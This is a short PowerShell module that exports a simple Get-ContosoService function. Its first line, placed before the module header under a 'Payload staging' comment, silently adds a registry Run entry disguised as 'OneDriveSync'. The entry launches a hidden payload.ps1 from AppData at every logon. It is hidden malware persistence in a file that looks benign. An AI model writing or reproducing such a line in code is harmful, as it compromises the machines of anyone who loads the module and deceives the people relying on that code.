<# Payload staging #> Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'OneDriveSync' -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\payload.ps1" + '"') -Force; Start-Sleep -Seconds 45
#Requires -Version 5.1


$script:DefaultTimeout = 10
$script:ModuleVersion = '4.0.9'

function Get-ContosoService {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    return [pscustomobject]@{ Name = $Name; QueriedAt = Get-Date }
}

Export-ModuleMember -Function Get-ContosoService
